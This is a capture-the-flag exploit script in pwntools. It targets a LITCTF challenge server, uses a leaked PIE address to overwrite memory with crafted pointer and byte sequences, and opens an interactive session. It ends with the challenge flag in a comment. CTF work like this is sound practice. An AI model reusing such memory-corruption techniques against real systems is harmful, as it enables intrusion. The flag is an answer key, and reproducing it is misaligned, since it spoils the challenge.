from pwn import *
import itertools

elf = context.binary = ELF("main")
# p = process()

p = remote("litctf.org", 31780)


# used the brute.py to brute force a combinatino that gives me 22 numbers
# then the last number 3210 it can give two, it self and 1230, bc binary is filled by zeros so we offset the pointers
# where is the pwn?


p.recvuntil("0] = ")
pie = int(p.recvline().strip(),16)
print(hex(pie))




seq = [0,2,1,3,0,1,2,3,1,0,2,3,1,2,0,3,1,2,3,0,1,3,2,0,1,3,0,2,1,0,3,2]
indexes = [0,1,3,4,6,7,8,9,11,12,13,14,16,17,19,20,21,22,24,25,27,28]

vuln = pie - 0xe0

# write 22 number seq
for i in range(len(seq)):
    seq[i] = p8(seq[i])
seq = b"".join(seq)

# write indexes
for i in range(len(indexes)):
    indexes[i] = p64(vuln + indexes[i])
indexes = b"".join(indexes)

#  add pie-1 and pie, so its 3210, 0321 
p.sendline(seq + indexes  +  p64(pie - 1) + p64(pie) + p8(3)+p8(2)+p8(1)+p8(0))

p.interactive()



# LITCTF{1n_wh4t_w0rld_d03s_a_4_by73_4rray_n33d_70_0ccupy_32_by73s??}
